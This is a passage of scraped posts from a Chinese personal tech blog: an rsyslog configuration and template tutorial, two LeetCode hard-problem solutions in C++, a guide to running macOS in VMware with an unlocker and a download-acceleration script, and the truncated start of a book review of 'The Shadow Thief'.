类型等等，官方为我们总结出了如下的表格：\nfacilities priority和selector 将消息源设备进行分类之后，就需要看看这条消息对应的是什么级别，priority（或者叫severity）就用来表示消息的严重性。\nSeverities facility + priority的形式能够唯一确定一条消息的种类，因此被称为 选择器（selector） 。正如我们所看到的规则那样，使用 facility.priority 的形式来指定一个选择器。其中，在不特别指定的情况下，选中的是 facility 设备类型所产生的 priority 级别及以上的消息，也就是说，一个 kern.info 选择器不仅能选中 kern 类型的 info 级别消息，还能选中 info 以上的所有级别。\n例如 kernel 进程产生了一条严重性为 warning 的信息，那么这条信息就将被 kern.info 或 kern.notice 等规则选中。\n除了基本的选择器用法，rsyslog在syslog的基础上扩展了一些选择器的语法。例如使用符号 = 可以 严格选中 某一优先级的消息，使用符号 ! 可以选中 除了 某一优先级的所有消息，最常用的 * 号表示这一字段的 所有取值 ，字段 none 常常配合 * 号使用，表示不记录某些facility的消息。还有一些使用表达式构造的选择器，在此不加叙述（因为在Linux默认配置中本身就用得不多），读者可以阅读文末给出的参考资料[1]来进行扩展学习。\naction 最后，是规则的最后一部分——动作（action）。这一部分的内容可以有较多的玩法，一般来说，我们使用两种操作：\naction字段写上一个文件名。如默认配置文件中的多数规则，这表示将选择器选中的消息记录到目标文件上。 action字段形如 @\u0026lt;IP\u0026gt;:\u0026lt;端口\u0026gt; ，这表示将选择器选中的消息 转发 到目标服务器的目标端口上。一个 @ 号表示使用UDP协议发送（默认），两个 @ 号表示使用TCP协议发送。例如我们配置一条规则 *.* @@192.168.0.1:514 表示将所有类型的、所有级别的消息都转发到服务器 192.168.0.1 的 514 端口。 至此，我们就了解了规则的含义，顺带地，你可以初步读懂Linux日志配置文件里的部分内容了。从这些规则出发，你能够对Linux系统下的一些日志文件有更深入的了解。我们再来看一下这些规则：\n*.info;mail.none;authpriv.none;cron.none /var/log/messages # 这条规则表示将除了 mail、authpriv、cron 的类型之外的所有设备类型的消息记录到 /var/log/messages 文件中 # 因此，你可以在 /var/log/message 文件中找到大部分日志消息 authpriv.* /var/log/secure # 这条规则表示将 authpriv 类型的所有级别消息记录到 /var/log/secure 文件中 # 因此，你应该在 /var/log/secure 文件中查看与授权信息相关的日志（如sshd登录记录，sudo认证记录等） mail.* -/var/log/maillog cron.* /var/log/cron 可以看到，上面三条规则的facility是互补的，把这几个文件综合起来看，相当于使用了 *.* 的选择器（info 级别已经和 * 差不多了），也就是说，你基本可以在上面的四个文件中查看到Linux系统产生的所有消息。\n模板Template 阅读至此，我们能够把任何需要的消息用我们希望的办法进行记录或转发，但仅仅采用默认的格式可能还远远不够。\n正常情况下，一条Linux日志长成这样：\nJul 2 23:30:03 localhost su: pam_unix(su:session): session opened for user root by xr_g(uid=0) 这一条日志分为几个部分： [时间戳] [主机名] [进程名和进程ID] [消息体] 。\n这可不是我瞎说的，因为rsyslog在记录日志的时候使用了默认的 模板 。\n如果你使用过Django或者什么其他的后端编程框架，很可能已经了解了模板的概念；如果你没接触过模板，不妨简单地将其看作一种 格式 ，就像你写论文时候的格式要求那样，所有的消息都要按照这种格式进行记录。而与你写论文时相同，论文模板里总是会指定一些较为宽泛的 属性 ，比如开头要写上摘要和关键字，所有人的论文都是相同的结构，但摘要和关键字的具体内容就因人而异了。\n日志的模板也正是如此，一条模板指定了日志的大致结构，就像上面提到的那样；而这一结构由一个一个的属性组成，日志守护进程需要根据这些属性往模板里填充数据，从而产生一条具体的日志。\n模板的定义 模板的定义办法有新旧两种，我个人比较习惯旧式的模板定义办法：\n# $template [模板名] [模板格式] $template MyTmp,\u0026#34;%timestamp% %hostname% %syslogfacility-text% %syslogseverity-text% %msg%\\n\u0026#34; 而新版的模板定义办法有若干个，例如：\ntemplate(name=\u0026#34;tpl3\u0026#34; type=\u0026#34;string\u0026#34; string=\u0026#34;%TIMESTAMP:::date-rfc3339% %HOSTNAME% %syslogtag%%msg:::sp-if-no-1st-sp%%msg:::drop-last-lf%\\n\u0026#34; ) 模板的使用 定义好了自己的模板之后，可以直接将模板应用在action字段上，具体办法就是在action原本的内容后加一个分号 ; ，然后写上自己的模板名。\n例如修改 /var/log/message 内容为我们自定义的格式：\n# Step1 设置模板，使用模板 [root@localhost log]# cat /etc/rsyslog.conf ··· $template MyTmp,\u0026#34;%timestamp% %hostname% %syslogfacility-text% %syslogseverity-text% %msg%\\n\u0026#34; ··· *.info;mail.none;authpriv.none;cron.none /var/log/messages;MyTmp # 注意这里！！！！ # Step2 重启rsyslog服务 [root@localhost log]# systemctl restart rsyslog # Step3 观察日志内容的变化 [root@localhost log]# tail /var/log/messages ··· Jul 2 23:57:55 localhost daemon info Stopped System Logging Service. Jul 2 23:57:55 localhost daemon info Starting System Logging Service... ··· rsyslog给出了一些模板中可用的属性，此处列出几个常用的属性，详细信息可以查看参考资料[2]。\n属性 含义 %timestamp% 时间戳，格式为默认为 MMM dd HH:mm:ss %syslogtag% 消息的标签，一般为 进程名[进程ID] 的形式，如 sshd[1234] %msg% 原程序发送的消息内容，这一字段由原始进程自行定义，一般各不相同 %fromhost-ip% 一般用于远程接收日志的服务器上，获取日志发送方的IP %syslogfacility-text% 以文字形式打印出facility %syslogseverity-text% 以文字形式打印出severity %hostname% 主机名 我们需要为自定义的模板命名，当然，不能与系统默认保留的一些模板重名，比如下面几个系统自带的模板：\ntemplate(name=\u0026#34;RSYSLOG_TraditionalForwardFormat\u0026#34; type=\u0026#34;string\u0026#34; string=\u0026#34;\u0026lt;%PRI%\u0026gt;%TIMESTAMP% %HOSTNAME% %syslogtag:1:32%%msg:::sp-if-no-1st-sp%%msg%\u0026#34;) template(name=\u0026#34;RSYSLOG_ForwardFormat\u0026#34; type=\u0026#34;string\u0026#34; string=\u0026#34;\u0026lt;%PRI%\u0026gt;%TIMESTAMP:::date-rfc3339% %HOSTNAME% %syslogtag:1:32%%msg:::sp-if-no-1st-sp%%msg%\u0026#34;) 更多的内容可以阅读参考资料[3]。\n注意上面给出的第一个系统模板 RSYSLOG_TraditionalForwardFormat ，这正是Linux系统中默认的日志格式，现在你明白前面我们对系统日志的格式解释是从何而来的了。\n小结 在实际工作中，syslog还有一些其他的玩法（如配置远程转发，日志模板的进阶使用等），在此就不予介绍了，之后有时间再开一篇。\n本文介绍了Linux日志机制的一个重要依赖——syslog/rsyslog，通过对日志配置文件、规则含义等的简要叙述，相信读者能够对Linux日志的机制有一个初步的理解，通过这些日志，你将能够揭开系统运行状态的面纱，更高效地排除错误，更快乐地生活。\n参考资料 [1] Filter Conditions — rsyslog 8.18.0.master documentation\n[2] RSyslog Documentation - properties - rsyslog\n[3] RSyslog Documentation - templates - rsyslog\n","date":"2021-07-03T00:00:00Z","permalink":"https://xrg.fj.cn/p/syslog%E6%9C%BA%E5%88%B6%E7%AE%80%E8%BF%B0/","title":"syslog机制简述"},{"content":"难题本为数不多的Hard题~\n题目 给你一个 m x n 的矩阵 matrix 和一个整数 k ，找出并返回矩阵内部矩形区域的不超过 k 的最大数值和。\n题目数据保证总会存在一个数值和不超过 k 的矩形区域。\n示例1\n输入： matrix = [[1,0,1],[0,-2,3]], k = 2 输出： 2 解释： 蓝色边框圈出来的矩形区域 [[0, 1], [-2, 3]] 的数值和是 2，且 2 是不超过 k 的最大数字（k = 2）。 示例2\n输入： matrix = [[2,2,-1]], k = 3 输出： 3 数据范围\nm == matrix.length n == matrix[i].length 1 \u0026lt;= m, n \u0026lt;= 100 -100 \u0026lt;= matrix[i][j] \u0026lt;= 100 -105 \u0026lt;= k \u0026lt;= 105 分析 我们要得到每一个小矩形，则可以：\n遍历上下界 遍历左右界 只分析遍历上下界的情况，当我们得到了一组确定的上下界之后，我们可以得到很多个矩形区域：\n例：确认上下界之后的矩形区域 可以看到，这个矩形区域由给定的上下界和 几个连续的列 组成。\n在这个矩形区域中，我们的总和不能超过 k 。只要我们求出每一列的总和，则可以将原问题转化为：\n给定一个整数数组和一个整数 k，计算该数组的最大区间和，要求区间和不超过 k。\n问题一、 如何快速求出每一列的总和呢？\n我们在最外层遍历上边界，对于递增的下边界来说，只需要在上一轮的结果中加上当前这一行的元素，即可得到每一列的总和。\n问题二、 如何快速求出不超过 k 的区间和呢？\n区间和不超过 k ，转化为公式如下：\n对于区间 s 、区间右端 r 和区间左端 l ，使得 prefix_sum[r] - prefix_sum[l - 1] \u0026lt;= k 。\n我们使用了前缀和 prefix_sum ，且区间左右都是闭合的。\n在本题中，我们可以从左向右遍历，计算出新的前缀和 prefix_sum[r] ，同时，我们使用一个 有序集合 保存以前计算过的所有前缀和即 prefix_sum[0 ~ l] ，从集合中快速查找是否存在一个元素满足上面的式子即可。\n说到有序集合，不得不提 set ，原式可以变化为 prefix_sum[l - 1] \u0026gt;= prefix_sum[r] - k ，即我们要找的元素正是 set.lower_bound(prefix_sum[r] - k) 。\nAC代码 class Solution { public: int maxSumSubmatrix(vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt;\u0026amp; matrix, int k) { int upper, lower; int row = matrix.size(); int col = matrix[0].size(); int ans = INT_MIN; for (upper = 0; upper \u0026lt; row; upper++) { vector\u0026lt;int\u0026gt; col_sum(col); for (lower = upper; lower \u0026lt; row; lower++) { for (int c = 0; c \u0026lt; col; c++) { col_sum[c] += matrix[lower][c]; } int right = 0; set\u0026lt;int\u0026gt; s = { 0 }; set\u0026lt;int\u0026gt;::iterator left; // for each right-pos for (int r = 0; r \u0026lt; col; r++) { // right --\u0026gt; prefix_sum[r] right += col_sum[r]; // right - left \u0026lt;= k // left \u0026gt;= right - k left = s.lower_bound(right - k); if (left != s.end()) { ans = max(ans, right - *left); } s.insert(right); } } } return ans; } }; 在上面的代码中，注意：\n每列的和 col_sum 是固定了上边界之后才开始计算的，故变量定义在第一层循环内； 有序集合初始需要一个 0 ，否则计算前缀和的时候无法考虑 prefix_sum[r] 本身； Performance 参考资料 [1] 力扣官方题解.矩形区域不超过 K 的最大数值和[EB/OL].2021-04-21\nhttps://leetcode-cn.com/problems/max-sum-of-rectangle-no-larger-than-k/solution/ju-xing-qu-yu-bu-chao-guo-k-de-zui-da-sh-70q2/\n","date":"2021-05-07T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E9%9A%BE%E9%A2%98%E6%9C%AC-leetcode363.-%E7%9F%A9%E5%BD%A2%E5%8C%BA%E5%9F%9F%E4%B8%8D%E8%B6%85%E8%BF%87-k-%E7%9A%84%E6%9C%80%E5%A4%A7%E6%95%B0%E5%80%BC%E5%92%8C/","title":"难题本 | LeetCode363. 矩形区域不超过 K 的最大数值和"},{"content":"愉快的五四青年节从遇到一道Hard的动态规划题结束~\n题目链接：1473. 粉刷房子 III - 力扣（LeetCode） (leetcode-cn.com)\n题目 在一个小城市里，有 m 个房子排成一排，你需要给每个房子涂上 n 种颜色之一（颜色编号为 1 到 n ）。有的房子去年夏天已经涂过颜色了，所以这些房子不需要被重新涂色。\n我们将连续相同颜色尽可能多的房子称为一个街区。（比方说 houses = [1,2,2,3,3,2,1,1] ，它包含 5 个街区 [{1}, {2,2}, {3,3}, {2}, {1,1}] 。）\n给你一个数组 houses ，一个 m * n 的矩阵 cost 和一个整数 target ，其中：\nhouses[i]：是第 i 个房子的颜色，0 表示这个房子还没有被涂色。 cost[i][j]：是将第 i 个房子涂成颜色 j+1 的花费。 请你返回房子涂色方案的最小总花费，使得每个房子都被涂色后，恰好组成 target 个街区。如果没有可用的涂色方案，请返回 -1 。\n示例1\n输入： houses = [0,0,0,0,0], cost = [[1,10],[10,1],[10,1],[1,10],[5,1]], m = 5, n = 2, target = 3 输出： 9 解释： 房子涂色方案为 [1,2,2,1,1]，此方案包含 target = 3 个街区，分别是 [{1}, {2,2}, {1,1}]。涂色的总花费为 (1 + 1 + 1 + 1 + 5) = 9。 示例2:\n输入： houses = [0,2,1,2,0], cost = [[1,10],[10,1],[10,1],[1,10],[5,1]], m = 5, n = 2, target = 3 输出： 11 解释： 有的房子已经被涂色了，在此基础上涂色方案为 [2,2,1,2,2]，此方案包含 target = 3 个街区，分别是 [{2,2}, {1}, {2,2}]。给第一个和最后一个房子涂色的花费为 (10 + 1) = 11。 数据范围\nm == houses.length == cost.length n == cost[i].length 1 \u0026lt;= m \u0026lt;= 100 1 \u0026lt;= n \u0026lt;= 20 1 \u0026lt;= target \u0026lt;= m 0 \u0026lt;= houses[i] \u0026lt;= n 1 \u0026lt;= cost[i][j] \u0026lt;= 10^4 分析 又是一道全无思路的题目。\n显然本题需要使用动态规划，查看提示，建议我们使用一个三维数组 dp[i][j][k] ，其中 i 表示当前房子的下标， j 表示当前房子应该上的颜色， k 表示算上当前的房子一共有多少街区。 dp[i][j][k] 表示所需的最少花费。\n我们与参考文章 [1] 使用相同的办法来对这些下标进行表示：\n房屋编号从 0 ~ m - 1 颜色编号从 0 ~ n - 1 街区编号从 0 ~ target - 1 对应颜色编号， houses 数组的值全部 减一 ，则 使用 -1 来表示原本没有上色的房子 。 已经给定了这些数据和下标的含义之后，再来进行思考就比较简单了。使用本文的代码来进行分析，对于下标 idx 的房子以及它被刷上的颜色 color 和现在已有的街区数 district ，我们发现 dp[idx][color][district] 的数值应该取决于当前房屋 和上一间房屋 的颜色，假如：\n当前房屋的颜色和上一间房屋的颜色 j0 相同，街区数量不会变化，则 dp[idx][color][district] == dp[idx - 1][color][district] ； 当前房屋颜色和上一间房屋的颜色 j0 不同，街区数量应该加一，则 dp[idx][color][district] == dp[idx - 1][j0][district - 1] ； 当然，房子原本的颜色也会影响 dp 值的变化，具体实际上只有两方面：\n房子原本没有颜色，即按照上面的规则 houses[idx] == -1 ，那么上面得到的 dp 值全都要加上 cost[idx][color] ； 房子原本有颜色，如果此颜色与 color 不同，那么这种上色方案无论如何是不可行的；如果此颜色与 color 相同，那么 dp 值就是我们上面分析的情况。 把这些分析加以实现，我们应该：\n- 枚举房子下标 --\u0026gt; idx: 0 ~ m - 1\r- 枚举上色方案 --\u0026gt; color: 0 ~ n - 1\r- 如果房子有颜色且不同于 color，继续枚举颜色\r- 运行至此有两种情况：房子没有颜色，或房子有颜色且颜色就是 color\r- 如果房子下标 idx 是 0， 意味着没有上一个房子，dp[idx][color][0] = houses[idx] == -1 ? cost[0][color] : 0;继续枚举颜色\r- 否则开始枚举街区 --\u0026gt; district: 0 ~ target - 1\r- 枚举上一间房子的颜色 --\u0026gt; j0: 0 ~ n - 1\r- 如果上一间房子的颜色和现在的颜色相同，设置 dp 值 // [1]\r- 如果上一间房子的颜色和现在的颜色不同，设置 dp 值 // [2]\r- 如果房子原本没有颜色，得到的 dp[idx][color][district] 要加上 cost[idx][color] 根据上面的实现来写代码，应该要注意几个要点：\n在伪代码 [1] 和 [2] 处，由于我们在进行上一间房子颜色的枚举，不能简单地设置 dp[idx][color][district] == dp[idx - 1][j0][district] ，而是应该根据 dp 的定义，取其中的最小值，即AC代码中所做的取 min 。 由于我们枚举的街区 district 从 0 开始，对于当前房屋和上一间房屋颜色不同的情况，需要判断街区数大于 0 才有意义。 注意 cost[idx] 添加的位置，枚举完上一间房子的颜色之后就进行添加，因为对于所有的 district 都要考虑这一情况。 我们如何表示 dp 的初始值：由于随时可能在一个未被修改的 dp 上加上我们的 cost ，那么它的初始值就不能设置得太大，在具体实现中，我们重新定义了一下 INT_MAX 。 AC代码 class Solution { public: #undef INT_MAX #define INT_MAX 0x3f3f3f3f // #define DEBUG int minCost(vector\u0026lt;int\u0026gt;\u0026amp; houses, vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt;\u0026amp; cost, int m, int n, int target) { int idx, color, district; vector\u0026lt;vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt;\u0026gt; dp(m, vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt;(n, vector\u0026lt;int\u0026gt;(target, INT_MAX))); for (int\u0026amp; hc : houses) { hc--; } for (idx = 0; idx \u0026lt; m; idx++) { for (color = 0; color \u0026lt; n; color++) { // this color can not be applied if (houses[idx] != -1 \u0026amp;\u0026amp; houses[idx] != color) continue; if (idx == 0) { dp[idx][color][0] = houses[idx] == -1 ? cost[0][color] : 0; continue; } // enum districts for (district = 0; district \u0026lt; target; district++) { // enum the color of house[idx - 1] !! for (int j0 = 0; j0 \u0026lt; n; j0++) { // same color if (j0 == color) { // the district will not change dp[idx][color][district] = min(dp[idx][color][district], dp[idx - 1][j0][district]); } else { if (district) dp[idx][color][district] = min(dp[idx][color][district], dp[idx - 1][j0][district - 1]); } } if (houses[idx] == -1) { dp[idx][color][district] += cost[idx][color]; } } } } # ifdef DEBUG for (idx = 0; idx \u0026lt; m; idx++) { cout \u0026lt;\u0026lt; \u0026#34;House \u0026#34; \u0026lt;\u0026lt; idx \u0026lt;\u0026lt; endl; for (color = 0; color \u0026lt; n; color++) { cout \u0026lt;\u0026lt; \u0026#39;\\t\u0026#39; \u0026lt;\u0026lt; \u0026#34;Color \u0026#34; \u0026lt;\u0026lt; color \u0026lt;\u0026lt; endl; for (district = 0; district \u0026lt; target; district++) { cout \u0026lt;\u0026lt; \u0026#34;\\t\\t\u0026#34; \u0026lt;\u0026lt; dp[idx][color][district] \u0026lt;\u0026lt; \u0026#34; \u0026#34;; } cout \u0026lt;\u0026lt; endl; } } #endif int ans = INT_MAX; for (color = 0; color \u0026lt; n; color++) { ans = min(ans, dp[m - 1][color][target - 1]); } if (ans == INT_MAX) return -1; else return ans; } }; Performance 参考文章 [1] 力扣官方题解.粉刷房子 III[EB/OL].2021-05-02\nhttps://leetcode-cn.com/problems/paint-house-iii/solution/fen-shua-fang-zi-iii-by-leetcode-solutio-powb/\n[2] 宫水三叶.【宫水三叶】三维动态规划，以及其「状态定义」由来[EB/OL].2020-05-04\nhttps://leetcode-cn.com/problems/paint-house-iii/solution/gong-shui-san-xie-san-wei-dong-tai-gui-h-ud7m/\n","date":"2021-05-04T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E9%9A%BE%E9%A2%98%E6%9C%AC-leetcode1473.-%E7%B2%89%E5%88%B7%E6%88%BF%E5%AD%90-iii/","title":"难题本 | LeetCode1473. 粉刷房子 III"},{"content":"如果你单纯地想体验一下以“简洁高效“闻名的Mac OS，那么我会强烈推荐你为自己创建一台Mac OS的虚拟机，使用这种方法，你不需要花费大几千元去购入一台Mac Book，就能得到最完整的系统体验。当然，假若你在体验之后爱上了这款系统，之后努力工作为自己的情怀买个单也是有所必要的。\n解锁VMWare 我们诸多步骤中最困难的一步就是解锁VMWare了。为什么叫解锁呢？因为我们使用的程序被作者命名为 unlocker ，就这么简单······ 我假定阅读本文的读者已经知道什么是VMWare，并且创建过自己的虚拟机，对于VMWare的安装等流程不再赘述。本文使用的是VMWare Workstation Pro 16 。\n正常的VMWare在创建虚拟机的时候，需要选择虚拟机操作系统，而且只有简单的几个选项（Windows/Linux/···）。我们在选项列表中看不到 apple MacOS 这类的字眼，因此我们要做的第一件事就是让VMWare能够创建 Mac OS 类型的虚拟机。 这一步真是非常的简单啊。总体而言，我们只需要进行三个步骤：\n下载 unlocker 软件 软件运行之前做一些前期的准备 运行！ Amazing，看起来一点都不难吧？\nStep1 我们去 这个网址 下载所需要的软件。\n对应于本文所使用的VMWare 16，你可以有两种选择：\nAuto-Unlocker v1.1.3 以一个 exe 的形式封装好了所有的流程，在我的测试中，这个软件总是不能成功解锁VMWare，令人生气。 根据某个 issue 中的办法，去 这里 下载另一个版本的 unlocker ，兄弟，这个办法真的管用！ 使用第二个办法，下载的文件解压之后大概是这样的： unlocker files 相信你能自己找到 win-install.cmd 这个文件，对吧？\nStep2 现在先不要急着运行，我们需要做一些运行之前的准备。\n打开任务管理器，首先杀掉跟VMWare有关的进程，它们一般都以 VM- 这样的格式开头。\n然后进入到任务管理器的【服务】面板，停止跟VMWare有关的服务，如 VMNetDHCP 等，它们的格式也都以 VM- 开头。\n不用担心服务没有关干净，或者进程杀不掉的问题。理论上我们的 unlocker 能够自动关掉这些服务，等到解锁完毕之后再启动它们。我在这里啰嗦这些，主要是忠实地记录我的实践结果，如果你运气好的话，跳过这一步最终也是可能成功的。\nStep3 万事俱备，我们右键那个 win-install.cmd ，以管理员身份运行，等它运行完毕了，你的VMWare应该就支持 Mac OS 了！ New option Q：VMWare 16，按照上面的流程走，没有效果怎么办？ A：首先可以尝试使用 VMWare installer 进行一个 repair 的操作，也就是修复VMWare的安装了。如果这一步还不行的话，可以试试其他版本的 unlocker 。 下载Mac OS镜像 这一步可就厉害了！我不会向你分享镜像的链接（网上多的很），但是我要告诉你怎么突破百度网盘的限速！ 总的来说，还是分成3个步骤：\n下载IDM\n下载并安装Temper Monkey\n下载直链助手插件，获取直链进行下载\n下载IDM IDM（Internet Download Manager）是一个多线程下载器，具体的原理大概就是面对一个大文件时，每一个线程从不同的起点开始下载，最终把每个线程下载的多个模块还原成原本的文件。当然，我们不需要深入探查它的实现方式，只需要去 这个地方 下载软件就好了！ 安装软件的过程就不多说了，据说Edge浏览器也可以集成IDM插件，但是在我的实践中好像并没有用到它。\n2022-05-28更新\n玩过黑苹果之后，没想到有一天又回到了虚拟机的怀抱 🤣\n我的 Yoga 13s 没有相应的Hackintosh教程，为了继续我的Mac OS之旅，决定还是装个虚拟机，以免想玩Mac的时候内心空虚。\n这篇教程里面的绝大部分操作仍是可行的！从 unlocker 到下文的 Temper Monkey 和直连助手，没想到时隔一年，这篇小文章的可复现性还那么高，看来当初瞎折腾取得的这点实践经验还是很可贵的。\n言归正传，此次复现放弃了IDM，而选用了 免费的 NDM ，在它跑起来的那一刻，内心泛起了一丝欣喜~\nNDM 下载并安装Temper Monkey 鼎鼎有名的Temper Monkey（油猴）是一个浏览器插件管理器，使用这个东西你可以方便地下载并使用大佬们创造并分享出来的JavaScript程序。在Edge的扩展商店中找到Temper Monkey，下载并安装就行了。\n安装直链助手 直链 是指百度网盘中的资源实际存储的链接，我们通过这个链接直接访问这个资源，就不用经过坑爹的限速服务器了！ 激活Temper Monkey之后，可以直接点击它搜索我们需要的脚本。 Find new scripts 当然，我已经亲测了若干款直链助手，可用的一款可以从 这里 下载。 使用这个助手，你需要将目标资源先转存到自己的网盘中，然后进行直链提取，否则提取到的链接可能被阻止访问。 在自己的网盘中，选中你所需要的文件（在这里当然是Mac OS的镜像了！），工具栏中应该出现【简易下载助手】这一按钮，单击进去，后面获取直链的操作就是傻瓜步骤了。\nDownload Manager 获取直链地址之后，根据它的提示先设置好IDM的一些参数，然后新建一个下载任务，把直链填进去，开始愉快地下载你的镜像吧！\nDownload speed 安装虚拟机 直接假定你已经会安装虚拟机了，这一步就说得简单一点吧。 在创建虚拟机时给什么样的配置合适呢？我的配置是：\n2核CPU 6G内存 50G硬盘 除了开机有点慢之外（可能因为我的虚拟机放在宿主机的机械硬盘上），运行起来还是比较流畅的。 第一次打开时，不要直接选择【安装macOS】，而要在设置完语言后先选择【磁盘工具】，选择VMWare Virtual SATA，并【抹掉】盘符内容及设置名称。 下面两幅图来自参考资料[1]。\nProcess disk first Erase disk 完成之后按【Esc】返回上一个页面，选择【安装macOS】，一路往下走即可。\n进入桌面后，你可以看到我们安装系统时使用的光盘，右键选择推出光盘，然后在VMWare的MacOS标签上右键选择【安装VMWare Tools】，一直继续安装。\n此时，会弹出一个VMWare的系统软件被阻止载入的提醒，我们进入【系统偏好设置】（也就是Apple通用的那个小齿轮标志），选择【安全与隐私】，先点击左下角解锁，然后允许VMWare在我们的电脑上安装程序。\n最后，安装完毕之后重启虚拟机，就可以开始愉快的Mac OS之旅了！\n在这一步的过程中截的图比较少，你可以阅读参考文章[1]来获取更多的信息。\n这一步下来，有几点需要注意：\nVMWare Tools可能无法一次成功，确保你在【安全与隐私】中允许VMWare安装程序；如果它不生效，就重新安装几次。 虚拟机无法连接Wi-Fi，但是由于我们是虚拟机，可以直接连接宿主机的网络， 无需再折腾网卡驱动了 ！这也是虚拟机体验Mac OS比真实物理机更加方便的一点。为了使我们的虚拟机能够通过NAT上网，记得在任务管理器中把第一步解锁VMWare时关闭的 VMNetDHCP 等服务重新开起来。 保护知识产权，体验体验也就好了，真心喜欢Mac的话记得为信仰充值！ 本文编写于Mac OS 。 MacOS animation Markdown edit 参考资料 [1] 小生观察室.新版VMWare之MacOS系统爬坑记[EB/OL].2020-10-20 https://mp.weixin.qq.com/s/rqw9m8JVJ_XHi4Ufst_rsQ\n[2] https://github.com/paolo-projects/auto-unlocker/issues/40\n","date":"2021-04-30T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E5%B0%9D%E5%B0%9D%E9%B2%9C%E4%B8%BA%E8%87%AA%E5%B7%B1%E8%A3%85%E4%B8%80%E5%8F%B0mac-os%E8%99%9A%E6%8B%9F%E6%9C%BA/","title":"尝尝鲜——为自己装一台Mac OS虚拟机"},{"content":"《偷影子的人》是一部好作品。\n人的一生会面对很多种情感，很大一部分是不可言传的。然而，法国人马克·吕维用他的简明而精巧的设计、温馨而幽默的笔触将一些宏大的、复杂的情感呈现在读者面前了。\n《偷影子的人》确实是一部好作品。\n小男孩有一个特殊的能力——与影子对话。当他的影子与别人的影子贴到一起，他可以从别人的影子那里听到影子主人的秘密；当别人的影子挤占了自己影子的位置时，别人的影子就被小男孩“偷”走了。\n人，总是有很多的秘密，潜藏内心的渴望、不愿想起的哀伤······得益于“偷”影子的能力，小男孩能够从最清晰的角度与人交往，一切都是纯粹的，除了自己的内心。\n友情 小男孩的第一个朋友是学校的警卫伊凡。\n这是他的倾听者，在这位忘年之交面前，他可以说出很多东西：对欺凌自己的马格的不满、对女生伊丽莎白的暗恋，大概除了自己“偷影子”的能力，其他的都是可以说的。伊凡在小男孩的童年里或多或少地扮演了一些父亲的角色，他具有生活的经验，是一个稳重的人。小男孩对伊凡的感情是珍惜，但并非对父亲那样的依赖。\n学校的煤气炉爆炸了，伊凡的影子活了起来，小男孩循着他的影子救了伊凡一条命。\n伊凡最珍惜的纪念册被烧了，小男孩从他的影子中得知了伊凡妈妈的事情。\n一位挚爱着自己腹中孩子的母亲，会对自己的孩子说些什么呢？小男孩让他的妈妈写下了这样一封特殊的信，他想弥补伊凡的缺憾。\n伊凡走了，为着自己未曾见面的母亲，他希望去践行全天下母亲的心愿：自己的孩子能过上幸福的生活。伊凡，辛苦了一生，遗憾了一生，日复一日的警卫工作磨灭了生命的热情，他本来将要迎来并送走一届又一届的小男孩，但是在最终，他的影子和一个“偷影子的人”给他带来了此生的意义。\n小男孩的第二个朋友是面包师家的吕克。\n这是他的同龄人，是他一生的好友，是他迷茫时候的明灯。\n吕克的梦想是什么呢？继承家业，做一个出色的面包师傅吗？不，受限于家庭的经济条件，吕克是无法去追求他的医学生梦想的，只能在小镇上，继承家业，做一个出色的面包师傅。\n吕克的影子和一个“偷影子的人”给他带来了逐梦的机会。吕克的父亲不爱自己的孩子吗？自己的家庭条件，让孩子去攻读医学是多么的奢侈！如果没有那个偷影子的人，这位面包师傅本来已经做好了让孩子、也让自己在遗憾中度过余生的打算；在那晚，偷影子的人来找自己，无需多言，希望自己给吕克一个实现梦想的机会。实现孩子的梦想，对自己的家庭来说是何其困难啊！一个强壮的面包师傅，在作坊前的长椅上哭得无比伤心。\n吕克终究是得到了逐梦的机会。梦想和现实的对比是多么强烈，复杂无趣的功课是每个人都能承受的吗？或者外科急诊的血肉模糊的伤员，解剖台那令人发怵的躯体，昼夜颠倒的工时？吕克很幸运，他的父亲不再逼迫他成为一名面包师，让他出来追求自己的梦想；而他认清了自我，知道了自己最终的梦想是当一位不用见血、不用旁观别人的死别就能为人们带来温饱和幸福的面包师傅。\n渡人亦是渡己，小男孩从这两份真挚的友情中收获了内心的清明。如果没有伊凡，童年时郁结于心的忧愁如何开解呢？如果没有吕克，就没有成年之后的对童年旧情的勇敢追求。\n爱情 一个孩子，是懂得爱情的吗？\n小男孩起初是不懂的，对伊丽莎白的朦朦胧胧的好感，只能归结于对美的天然追求。但是很快他就意识到，唯其萦绕于心，经久不忘，别来怅然，方可称为爱情。\n小男孩是懂得爱情的。\n克蕾儿是一个多么值得爱的女孩啊！她和偷影子的人是多么合适的伴侣啊！\n“我不知道对我来说哪一样比较痛苦，是从背后传来的讪笑，或是朝我射来的轻视眼光。谁会愿意爱上一个无法言语的女孩，一个笑时会发出嘶哑叫声的女孩？谁能在我害怕时给我安全感？我真的很害怕，我什么都听不到，包括脑海中的声音。我害怕长大，我很孤单，我的白昼如同无止境的黑夜，而我如同行尸走肉一般穿越其中。”\n世上没有任何一个女孩敢对一个刚认识的男孩说出同样的话。这些话并非由克蕾儿的口中发出，而是她的影子在沙滩上低低地向我诉说，我终于明白了为何之前影子会向我求救。\n“克蕾儿，你要知道，对我来说，你是全世界最美丽的女孩，是那种可以用嘶哑叫声擦去天空的阴暗、有着大提琴音色般的女孩。你要知道，全世界没有一个女孩可以像你一样让风筝快速旋转。\n“这些话，我只敢悄悄在你背后喃喃地说，不敢让你听到。一面对你，我就成了哑巴。”\n自第一次分别之后，十余年间两人不曾再见。小男孩吻了伊丽莎白，隔天便分手了；读医学生时认识了苏菲，从友情升格为爱情之后，爱情的光终究黯淡褪色。小男孩没有得到幸福，直到他再次回到与克蕾儿相见的海滩，回到两人秘密的灯塔里。\n我等了你四个夏天，你没有信守承诺，你再也没有回来。风筝死了，我将它埋葬在这里，谁知道呢，也许有一天你会找到它。\n署名：克蕾儿\n我的夏日知己变得如何了呢？那个因为听不到声音，而让我可以毫不畏惧地向她倾诉所有秘密的小女孩啊！\n我闭上眼睛，我们曾经跑得上气不接下气，被带路的老鹰风筝拖着跑，你放风筝的功力无人能及，常常会有路上的行人停下脚步，只为欣赏你灵活的技巧。曾经有多少次，我牵着你的手走到这相同之地？你现在怎样了？你如今身在何方？你又会在哪个沙滩度过每个夏天？\n何其的凄美啊！遗憾总是贯穿所有人的人生，童年最炽热的感情被时间尘封，最终掩盖记忆的尘埃却被一些偶然的